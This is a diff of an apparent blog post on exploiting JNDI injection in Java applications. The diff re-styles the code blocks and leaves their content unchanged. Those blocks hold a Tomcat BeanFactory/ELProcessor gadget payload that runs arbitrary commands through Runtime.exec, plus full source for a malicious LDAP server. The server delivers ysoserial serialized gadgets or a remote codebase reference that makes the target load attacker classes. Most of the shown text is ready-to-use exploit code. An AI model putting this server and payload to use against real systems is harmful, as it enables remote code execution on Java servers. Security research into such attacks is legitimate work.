@@ -361,25 +361,21 @@
         <p>The gadget is tomcat version specific.THe last version i check where it was working was tomcat 8.5.75</p>
         <p>To understand what this gadget is, lets take a look into the Malicous LDap Code(we will see how to build you own later in this blog post)
             <p>The gadget uses the org.apache.naming.factory.BeanFactory class along with javax.el.ELProcessor to send our malicous payload i.e 
-                <code><pre>String payload = ("{" +
-                    "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
-                    ".newInstance().getEngineByName(\"JavaScript\")" +
-                    ".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")" +
-                    "}")
-                    .replace("${command}", makeJavaScriptString(Config.command));</pre></code>
+                <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">String</span> payload = (<span style="color: #6aab73;">"{"</span> +
+        <span style="color: #6aab73;">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\")"</span> +
+        <span style="color: #6aab73;">".newInstance().getEngineByName(\"JavaScript\")"</span> +
+        <span style="color: #6aab73;">".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")"</span> +
+        <span style="color: #6aab73;">"}"</span>)
+        .<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"${command}"</span>, <span style="color: #56a8f5;">makeJavaScriptString</span>(<span style="color: #cf8e6d;">Config</span>.command));</pre></div>
                     <p>Now why does this particular class is used is out side the scope of this blog </p>
                     <p>Checkout <a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">Exploiting JNDI Injection In Java Veracode</a> To learn about it.</p>
             </i></p>
         <p>So If the tomcat server uses the tomcat server with the below version then the above gadget can be used to get code execution</p>
         <p>
-            <code>
-                <pre>
-                    8.5.x for 8.5.79 onwards
-                    9.0.x for 9.0.63 onwards
-                    10.0.x for 10.0.21 onwards
-                    10.1.x for 10.1.0-M14 onwards
-                </pre>
-            </code>
+            <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #bcbec4;">8.5.x for 8.5.79 onwards
+9.0.x for 9.0.63 onwards
+10.0.x for 10.0.21 onwards
+10.1.x for 10.1.0-M14 onwards</span></pre></div>
         </p>
         <p>So lets change our code to use the tomcat gadget</p>
 
@@ -412,40 +408,29 @@
        
        <h3>For Remote Class Loading</h3>
        <p>
-        <code>
-            <pre>
-    org.struts2Test.jndiTestAction.execute
-        javax.naming.InitialContext.lookup(409)
-            com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
-                com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:220)
-                    com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
-                        com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
-                            com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1115)
-                                com.sun.naming.internal.getDirObjectInstance(NamingManagerHelper.java:105)
-                                    com.sun.naming.internal.getObjectFactoryFromReference(NamingManagerHelper.java:206)
-                                        com.sun.naming.internal.VersionHelper.loadclass(VersionHelper.java:110)
-
-            </pre>
-        </code>
+        <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">org.struts2Test.jndiTestAction</span>.<span style="color: #56a8f5;">execute</span>
+    <span style="color: #cf8e6d;">javax.naming.InitialContext</span>.<span style="color: #56a8f5;">lookup</span>(<span style="color: #b3ae60;">409</span>)
+        <span style="color: #cf8e6d;">com.sun.jndi.url.ldap.ldapURLContext</span>.<span style="color: #56a8f5;">lookup</span>(ldapURLContext.java:<span style="color: #b3ae60;">94</span>)
+            <span style="color: #cf8e6d;">com.sun.jndi.toolkit.url.GenericURLContext</span>.<span style="color: #56a8f5;">lookup</span>(GenericURLContext.java:<span style="color: #b3ae60;">220</span>)
+                <span style="color: #cf8e6d;">com.sun.jndi.toolkit.ctx.PartialCompositeContext</span>.<span style="color: #56a8f5;">lookup</span>(PartialCompositeContext.java:<span style="color: #b3ae60;">177</span>)
+                    <span style="color: #cf8e6d;">com.sun.jndi.toolkit.ctx.ComponentContext</span>.<span style="color: #56a8f5;">p_lookup</span>(ComponentContext.java:<span style="color: #b3ae60;">542</span>)
+                        <span style="color: #cf8e6d;">com.sun.jndi.ldap.LdapCtx</span>.<span style="color: #56a8f5;">c_lookup</span>(LdapCtx.java:<span style="color: #b3ae60;">1115</span>)
+                            <span style="color: #cf8e6d;">com.sun.naming.internal</span>.<span style="color: #56a8f5;">getDirObjectInstance</span>(NamingManagerHelper.java:<span style="color: #b3ae60;">105</span>)
+                                <span style="color: #cf8e6d;">com.sun.naming.internal</span>.<span style="color: #56a8f5;">getObjectFactoryFromReference</span>(NamingManagerHelper.java:<span style="color: #b3ae60;">206</span>)
+                                    <span style="color: #cf8e6d;">com.sun.naming.internal.VersionHelper</span>.<span style="color: #56a8f5;">loadclass</span>(VersionHelper.java:<span style="color: #b3ae60;">110</span>)</pre></div>
     </p>
        <h3>For exploit using 3rd party gadgets</h3>
         <p>
-            <code>
-                <pre>
-    org.struts2Test.jndiTestAction.execute
-        javax.naming.InitialContext.lookup(409)
-            com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
-                com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:220)
-                    com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
-                        com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
-                            com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1081)
-                                com.sun.jndi.ldap.Obj.decodeObject(Obj.java:240)
-                                    com.sun.jndi.ldap.Obj.deserializeObject(Obj.java:532)
-                                        com.sun.jndi.ldap.Obj.deserializeObject(Obj.java:532)
-
-                                    
-                </pre>
-            </code>
+            <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">org.struts2Test.jndiTestAction</span>.<span style="color: #56a8f5;">execute</span>
+    <span style="color: #cf8e6d;">javax.naming.InitialContext</span>.<span style="color: #56a8f5;">lookup</span>(<span style="color: #b3ae60;">409</span>)
+        <span style="color: #cf8e6d;">com.sun.jndi.url.ldap.ldapURLContext</span>.<span style="color: #56a8f5;">lookup</span>(ldapURLContext.java:<span style="color: #b3ae60;">94</span>)
+            <span style="color: #cf8e6d;">com.sun.jndi.toolkit.url.GenericURLContext</span>.<span style="color: #56a8f5;">lookup</span>(GenericURLContext.java:<span style="color: #b3ae60;">220</span>)
+                <span style="color: #cf8e6d;">com.sun.jndi.toolkit.ctx.PartialCompositeContext</span>.<span style="color: #56a8f5;">lookup</span>(PartialCompositeContext.java:<span style="color: #b3ae60;">177</span>)
+                    <span style="color: #cf8e6d;">com.sun.jndi.toolkit.ctx.ComponentContext</span>.<span style="color: #56a8f5;">p_lookup</span>(ComponentContext.java:<span style="color: #b3ae60;">542</span>)
+                        <span style="color: #cf8e6d;">com.sun.jndi.ldap.LdapCtx</span>.<span style="color: #56a8f5;">c_lookup</span>(LdapCtx.java:<span style="color: #b3ae60;">1081</span>)
+                            <span style="color: #cf8e6d;">com.sun.jndi.ldap.Obj</span>.<span style="color: #56a8f5;">decodeObject</span>(Obj.java:<span style="color: #b3ae60;">240</span>)
+                                <span style="color: #cf8e6d;">com.sun.jndi.ldap.Obj</span>.<span style="color: #56a8f5;">deserializeObject</span>(Obj.java:<span style="color: #b3ae60;">532</span>)
+                                    <span style="color: #cf8e6d;">com.sun.jndi.ldap.Obj</span>.<span style="color: #56a8f5;">deserializeObject</span>(Obj.java:<span style="color: #b3ae60;">532</span>)</pre></div>
         </p>
         <div>
             Now lets answer few of our questions via this code flow.
@@ -511,124 +496,99 @@
         <p>
             <ol>
                 <li>Configure the  in-memory LDAP Serverr</li>
-                <code>
-                    <pre>
-                    public class ldaptest {
+                <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public class</span> ldaptest {
 
-                        //Setting up the configuration for the malicious LDAP Server
-                            InMemoryDirectoryServerConfig serverConfiguration() throws LDAPException
-                            {
-                                    InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("random=test");
-                                    InMemoryListenerConfig listenerConfig = InMemoryListenerConfig.createLDAPConfig("default", 1389);
-                                    config.setListenerConfigs(listenerConfig);
-                                    return config;
-                            }
-                        </pre> 
-                </code>
+    <span style="color: #808080;">//Setting up the configuration for the malicious LDAP Server</span>
+    <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> <span style="color: #56a8f5;">serverConfiguration</span>() <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">LDAPException</span> {
+        <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> config = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span>(<span style="color: #6aab73;">"random=test"</span>);
+        <span style="color: #cf8e6d;">InMemoryListenerConfig</span> listenerConfig = <span style="color: #cf8e6d;">InMemoryListenerConfig</span>.<span style="color: #56a8f5;">createLDAPConfig</span>(<span style="color: #6aab73;">"default"</span>, <span style="color: #b3ae60;">1389</span>);
+        config.<span style="color: #56a8f5;">setListenerConfigs</span>(listenerConfig);
+        <span style="color: #cf8e6d;">return</span> config;
+    }
+}</pre></div>
                 <li>Add entries that returns serialized data for a particular search</li>
-                <code>
-                    <pre>
-                        //Creating Malicous Entries TO send Serilised Data
-                        InMemoryDirectoryServerConfig malicousServerEntryAndResponse(byte[] decodedBytes) throws LDAPException
-                        {
-                            InMemoryDirectoryServerConfig config=serverConfiguration();
-                    
-                    
-                    
-                            //Itnercepting the Call and sending Malcious Response
-                            config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
-                                @Override
-                                public void processSearchResult(InMemoryInterceptedSearchResult result) {
-                                    ReadOnlySearchRequest request = result.getRequest();
-                                    if (request.getBaseDN().toString().equalsIgnoreCase("o=custom")) {
-                                        System.out.println("Inside Malicious EntryFucntion() on custome thing");
-                                        Entry entry = new Entry("o=custom");
-                                        entry.addAttribute("javaClassName", "java.lang.String");
-                                        entry.addAttribute("javaSerializedData", decodedBytes);
-                                        System.out.println("service Response");
-                                        try {
-                                            result.sendSearchEntry(entry);
-                                            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
-                                        } catch (LDAPException e) {
-                                            e.printStackTrace();
-                                        }
-                                    } else {
-                                        result.setResult(new LDAPResult(0, ResultCode.NO_SUCH_OBJECT));
-                                    }
-                                }
-                            });
-                    
-                    
-                            return config;
-                        }
-                    </pre>
+                <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #808080;">//Creating Malicous Entries TO send Serilised Data</span>
+<span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> <span style="color: #56a8f5;">malicousServerEntryAndResponse</span>(<span style="color: #cf8e6d;">byte</span>[] decodedBytes) <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">LDAPException</span> {
+    <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> config = <span style="color: #56a8f5;">serverConfiguration</span>();
+
+    <span style="color: #808080;">//Intercepting the Call and sending Malicious Response</span>
+    config.<span style="color: #56a8f5;">addInMemoryOperationInterceptor</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryOperationInterceptor</span>() {
+        <span style="color: #b3ae60;">@Override</span>
+        <span style="color: #cf8e6d;">public void</span> <span style="color: #56a8f5;">processSearchResult</span>(<span style="color: #cf8e6d;">InMemoryInterceptedSearchResult</span> result) {
+            <span style="color: #cf8e6d;">ReadOnlySearchRequest</span> request = result.<span style="color: #56a8f5;">getRequest</span>();
+            <span style="color: #cf8e6d;">if</span> (request.<span style="color: #56a8f5;">getBaseDN</span>().<span style="color: #56a8f5;">toString</span>().<span style="color: #56a8f5;">equalsIgnoreCase</span>(<span style="color: #6aab73;">"o=custom"</span>)) {
+                <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"Inside Malicious EntryFunction() on custom thing"</span>);
+                <span style="color: #cf8e6d;">Entry</span> entry = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Entry</span>(<span style="color: #6aab73;">"o=custom"</span>);
+                entry.<span style="color: #56a8f5;">addAttribute</span>(<span style="color: #6aab73;">"javaClassName"</span>, <span style="color: #6aab73;">"java.lang.String"</span>);
+                entry.<span style="color: #56a8f5;">addAttribute</span>(<span style="color: #6aab73;">"javaSerializedData"</span>, decodedBytes);
+                <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"service Response"</span>);
+                <span style="color: #cf8e6d;">try</span> {
+                    result.<span style="color: #56a8f5;">sendSearchEntry</span>(entry);
+                    result.<span style="color: #56a8f5;">setResult</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">LDAPResult</span>(<span style="color: #b3ae60;">0</span>, <span style="color: #cf8e6d;">ResultCode</span>.SUCCESS));
+                } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">LDAPException</span> e) {
+                    e.<span style="color: #56a8f5;">printStackTrace</span>();
+                }
+            } <span style="color: #cf8e6d;">else</span> {
+                result.<span style="color: #56a8f5;">setResult</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">LDAPResult</span>(<span style="color: #b3ae60;">0</span>, <span style="color: #cf8e6d;">ResultCode</span>.NO_SUCH_OBJECT));
+            }
+        }
+    });
+
+    <span style="color: #cf8e6d;">return</span> config;
+}</pre></div>
                 </code>
                 <li>Start the ldap server</li>
-                <code><pre>
-                    //Main Method
-                    public static void main(String[] args) {
-                        try {
-                            //Ysoserial Payload
-                            String ser_data="base64 encoded Serilised Gadget Data";
-                            byte[] decodedBytes = Base64.getDecoder().decode(ser_data);
-                
-                
-                            ldaptest obj=new ldaptest();
-                            
-                
-                            //Starts the LDAP Server
-                            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(obj.malicousServerEntryAndResponse(decodedBytes));
-                            ds.startListening();
-                            System.out.println("LDAP Server started on port 1389");
-                
-                        } catch (Exception e) {
-                            e.printStackTrace();
-                        }
-                    }
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #808080;">//Main Method</span>
+<span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) {
+    <span style="color: #cf8e6d;">try</span> {
+        <span style="color: #808080;">//Ysoserial Payload</span>
+        <span style="color: #cf8e6d;">String</span> ser_data = <span style="color: #6aab73;">"base64 encoded Serilised Gadget Data"</span>;
+        <span style="color: #cf8e6d;">byte</span>[] decodedBytes = <span style="color: #cf8e6d;">Base64</span>.<span style="color: #56a8f5;">getDecoder</span>().<span style="color: #56a8f5;">decode</span>(ser_data);
 
-                    
-                </pre></code>
+        ldaptest obj = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">ldaptest</span>();
+
+        <span style="color: #808080;">//Starts the LDAP Server</span>
+        <span style="color: #cf8e6d;">InMemoryDirectoryServer</span> ds = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryDirectoryServer</span>(obj.<span style="color: #56a8f5;">malicousServerEntryAndResponse</span>(decodedBytes));
+        ds.<span style="color: #56a8f5;">startListening</span>();
+        <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"LDAP Server started on port 1389"</span>);
+
+    } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">Exception</span> e) {
+        e.<span style="color: #56a8f5;">printStackTrace</span>();
+    }
+}</pre></div>
                 <div><p>
                     <i>Adding all the above, a sample malicious LDAP Server code should look like below</i>
                 </p>
                 <p>
-                    <code>
-                        <pre>
-import java.util.Base64;
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.Base64;
 
-import com.unboundid.ldap.listener.InMemoryDirectoryServer;
-import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
-import com.unboundid.ldap.listener.InMemoryListenerConfig;
-import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
-import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
-import com.unboundid.ldap.sdk.*;
+<span style="color: #cf8e6d;">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;
+<span style="color: #cf8e6d;">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+<span style="color: #cf8e6d;">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;
+<span style="color: #cf8e6d;">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+<span style="color: #cf8e6d;">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+<span style="color: #cf8e6d;">import</span> com.unboundid.ldap.sdk.*;
 
-public class ldaptest {
+<span style="color: #cf8e6d;">public class</span> ldaptest {
 
-//Setting up the configuration for the malicious LDAP Server
-    InMemoryDirectoryServerConfig serverConfiguration() throws LDAPException
-    {
-            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("random=test");
-            InMemoryListenerConfig listenerConfig = InMemoryListenerConfig.createLDAPConfig("default", 1389);
-            config.setListenerConfigs(listenerConfig);
-            return config;
+    <span style="color: #808080;">//Setting up the configuration for the malicious LDAP Server</span>
+    <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> <span style="color: #56a8f5;">serverConfiguration</span>() <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">LDAPException</span> {
+        <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> config = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span>(<span style="color: #6aab73;">"random=test"</span>);
+        <span style="color: #cf8e6d;">InMemoryListenerConfig</span> listenerConfig = <span style="color: #cf8e6d;">InMemoryListenerConfig</span>.<span style="color: #56a8f5;">createLDAPConfig</span>(<span style="color: #6aab73;">"default"</span>, <span style="color: #b3ae60;">1389</span>);
+        config.<span style="color: #56a8f5;">setListenerConfigs</span>(listenerConfig);
+        <span style="color: #cf8e6d;">return</span> config;
     }
 
+    <span style="color: #808080;">//Creating Malicious Entries TO send Serialised Data</span>
+    <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> <span style="color: #56a8f5;">malicousServerEntryAndResponse</span>(<span style="color: #cf8e6d;">byte</span>[] decodedBytes) <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">LDAPException</span> {
+        <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> config = <span style="color: #56a8f5;">serverConfiguration</span>();
 
-
-    //Creating Malicous Entries TO send Serilised Data
-    InMemoryDirectoryServerConfig malicousServerEntryAndResponse(byte[] decodedBytes) throws LDAPException
-    {
-        InMemoryDirectoryServerConfig config=serverConfiguration();
-
-
-
-        //Itnercepting the Call and sending Malcious Response
-        config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
-            @Override
-            public void processSearchResult(InMemoryInterceptedSearchResult result) {
-                ReadOnlySearchRequest request = result.getRequest();
-                if (request.getBaseDN().toString().equalsIgnoreCase("o=custom")) {
+        <span style="color: #808080;">//Intercepting the Call and sending Malicious Response</span>
+        config.<span style="color: #56a8f5;">addInMemoryOperationInterceptor</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryOperationInterceptor</span>() {
+            <span style="color: #b3ae60;">@Override</span>
+            <span style="color: #cf8e6d;">public void</span> <span style="color: #56a8f5;">processSearchResult</span>(<span style="color: #cf8e6d;">InMemoryInterceptedSearchResult</span> result) {
+                <span style="color: #cf8e6d;">ReadOnlySearchRequest</span> request = result.<span style="color: #56a8f5;">getRequest</span>();
+                <span style="color: #cf8e6d;">if</span> (request.<span style="color: #56a8f5;">getBaseDN</span>().<span style="color: #56a8f5;">toString</span>().<span style="color: #56a8f5;">equalsIgnoreCase</span>(<span style="color: #6aab73;">"o=custom"</span>)) {</pre></div>
                     System.out.println("Inside Malicious EntryFucntion() on custome thing");
                     Entry entry = new Entry("o=custom");
                     entry.addAttribute("javaClassName", "java.lang.String");
@@ -650,31 +610,26 @@ public class ldaptest {
         return config;
     }
 
-    //Main Method
-    public static void main(String[] args) {
-        try {
-            //Ysoserial Payload
-            String ser_data="base64 encoded Serilised Gadget Data";
+    <span style="color: #808080;">//Main Method</span>
+    <span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">static</span> <span style="color: #cf8e6d;">void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) {
+        <span style="color: #cf8e6d;">try</span> {
+            <span style="color: #808080;">//Ysoserial Payload</span>
+            <span style="color: #cf8e6d;">String</span> ser_data = <span style="color: #6aab73;">"base64 encoded Serilised Gadget Data"</span>;
            
-            byte[] decodedBytes = Base64.getDecoder().decode(ser_data);
+            <span style="color: #cf8e6d;">byte</span>[] decodedBytes = <span style="color: #cf8e6d;">Base64</span>.<span style="color: #56a8f5;">getDecoder</span>().<span style="color: #56a8f5;">decode</span>(ser_data);
 
-
-            ldaptest obj=new ldaptest();
+            <span style="color: #cf8e6d;">ldaptest</span> obj = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ldaptest</span>();
             
+            <span style="color: #808080;">//Starts the LDAP Server</span>
+            <span style="color: #cf8e6d;">InMemoryDirectoryServer</span> ds = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryDirectoryServer</span>(obj.<span style="color: #56a8f5;">malicousServerEntryAndResponse</span>(decodedBytes));
+            ds.<span style="color: #56a8f5;">startListening</span>();
+            <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"LDAP Server started on port 1389"</span>);
 
-            //Starts the LDAP Server
-            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(obj.malicousServerEntryAndResponse(decodedBytes));
-            ds.startListening();
-            System.out.println("LDAP Server started on port 1389");
-
-        } catch (Exception e) {
-            e.printStackTrace();
+        } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">Exception</span> e) {
+            e.<span style="color: #56a8f5;">printStackTrace</span>();
         }
     }
-}
-
-                        </pre>
-                    </code>
+}</pre></div>
                 </p>
                 </div>
     </ol>
@@ -684,45 +639,37 @@ public class ldaptest {
 <div><h4>For Remote Class Loading:</h4></div>
 <p>For remote class loading we have to change the malicousServerEntryAndResponse() as below.  </p>
 <p>
-    <code>
-        <pre>
-            InMemoryDirectoryServerConfig malicousServerEntryAndResponse(byte[] decodedBytes) throws LDAPException
-                {
-                InMemoryDirectoryServerConfig config=serverConfiguration();
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> <span style="color: #56a8f5;">malicousServerEntryAndResponse</span>(<span style="color: #cf8e6d;">byte</span>[] decodedBytes) <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">LDAPException</span> {
+    <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> config = <span style="color: #56a8f5;">serverConfiguration</span>();
 
+    <span style="color: #808080;">//Intercepting the Call and sending Malicious Response</span>
+    config.<span style="color: #56a8f5;">addInMemoryOperationInterceptor</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryOperationInterceptor</span>() {
+        <span style="color: #bbb529;">@Override</span>
+        <span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">void</span> <span style="color: #56a8f5;">processSearchResult</span>(<span style="color: #cf8e6d;">InMemoryInterceptedSearchResult</span> result) {
+            <span style="color: #cf8e6d;">ReadOnlySearchRequest</span> request = result.<span style="color: #56a8f5;">getRequest</span>();
+            <span style="color: #cf8e6d;">if</span> (request.<span style="color: #56a8f5;">getBaseDN</span>().<span style="color: #56a8f5;">toString</span>().<span style="color: #56a8f5;">equalsIgnoreCase</span>(<span style="color: #6aab73;">"o=custom"</span>)) {
+                <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"Inside Malicious EntryFunction() on custom thing"</span>);
+                <span style="color: #cf8e6d;">Entry</span> entry = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Entry</span>(<span style="color: #6aab73;">"o=custom"</span>);
+                entry.<span style="color: #56a8f5;">addAttribute</span>(<span style="color: #6aab73;">"objectClass"</span>, <span style="color: #6aab73;">"javaNamingReference"</span>);
+                entry.<span style="color: #56a8f5;">addAttribute</span>(<span style="color: #6aab73;">"javaClassName"</span>, <span style="color: #6aab73;">"java.lang.String"</span>); <span style="color: #808080;">//could be any unknown</span>
+                entry.<span style="color: #56a8f5;">addAttribute</span>(<span style="color: #6aab73;">"javaFactory"</span>, <span style="color: #6aab73;">"testObject"</span>); <span style="color: #808080;">//could be any unknown</span>
+                entry.<span style="color: #56a8f5;">addAttribute</span>(<span style="color: #6aab73;">"javaCodebase"</span>, <span style="color: #6aab73;">"http://localhost:9004/"</span>);
+                <span style="color: #808080;">//entry.addAttribute("javaSerializedData", decodedBytes);</span>
+                <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"service Response"</span>);
+                <span style="color: #cf8e6d;">try</span> {
+                    result.<span style="color: #56a8f5;">sendSearchEntry</span>(entry);
+                    result.<span style="color: #56a8f5;">setResult</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">LDAPResult</span>(<span style="color: #b3ae60;">0</span>, <span style="color: #cf8e6d;">ResultCode</span>.SUCCESS));
+                } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">LDAPException</span> e) {
+                    e.<span style="color: #56a8f5;">printStackTrace</span>();
+                }
+            } <span style="color: #cf8e6d;">else</span> {
+                result.<span style="color: #56a8f5;">setResult</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">LDAPResult</span>(<span style="color: #b3ae60;">0</span>, <span style="color: #cf8e6d;">ResultCode</span>.NO_SUCH_OBJECT));
+            }
+        }
+    });
 
-
-                //Itnercepting the Call and sending Malcious Response
-                config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
-                    @Override
-                    public void processSearchResult(InMemoryInterceptedSearchResult result) {
-                        ReadOnlySearchRequest request = result.getRequest();
-                        if (request.getBaseDN().toString().equalsIgnoreCase("o=custom")) {
-                            System.out.println("Inside Malicious EntryFucntion() on custome thing");
-                            Entry entry = new Entry("o=custom");
-                            entry.addAttribute("objectClass", "javaNamingReference");
-                            entry.addAttribute("javaClassName", "java.lang.String"); //could be any unknown
-                            entry.addAttribute("javaFactory", "testObject"); //could be any unknown
-                            entry.addAttribute("javaCodebase", "http://localhost:9004/");
-                            //entry.addAttribute("javaSerializedData", decodedBytes);
-                            System.out.println("service Response");
-                            try {
-                                result.sendSearchEntry(entry);
-                                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
-                            } catch (LDAPException e) {
-                                e.printStackTrace();
-                            }
-                        } else {
-                            result.setResult(new LDAPResult(0, ResultCode.NO_SUCH_OBJECT));
-                        }
-                    }
-                });
-
-
-                return config;
-    }
-        </pre>
-    </code>
+    <span style="color: #cf8e6d;">return</span> config;
+}</pre></div>
 </p>
 <p>
     we have added 4 new entires and removed the javaSerializedData attribute.
